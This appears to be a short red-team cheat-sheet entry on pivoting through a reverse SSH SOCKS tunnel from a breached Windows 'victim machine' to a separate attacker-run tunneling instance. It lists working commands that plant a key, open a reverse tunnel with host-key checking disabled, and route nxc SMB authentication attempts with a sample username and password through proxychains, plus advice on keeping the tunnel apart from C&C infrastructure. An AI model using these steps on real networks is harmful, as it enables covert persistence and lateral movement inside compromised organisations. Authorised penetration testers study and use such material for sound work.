TBD

## SSH Remote SOCKS Client
- If the network did not block an outbound connection
- ssh client in windows is exist (usually exist)
- not very OPSEC
- Reference: https://trustedsec.com/blog/the-socks-we-have-at-home

```
1. Deploy a dedicated instance / machine for this tunneling purpose, make sure that the network segmentation is separated from your C&C infrastructure (Separate VPC). 

2. Create a non root privilege user in tunneling instance
3. Generate new SSH Key in victim machine' side, put the pub key within the authorized_key of the tunneling instance 

4. Start port forwarding originate from breached machine
> ssh -R 9095 forward@remoteserver -o StrictHostKeyChecking=no
> ssh forward@remoteserver -R 9050 -N -o StrictHostKeyChecking=no

4. Configure proxychains in tunneling instance
> socks5 127.0.0.1 9095

5. Test your pivoting setup
> proxychains4 -q nxc smb [victimip] -u jose.monitaz -p V3rySecur3P@ssword -d acme.com
```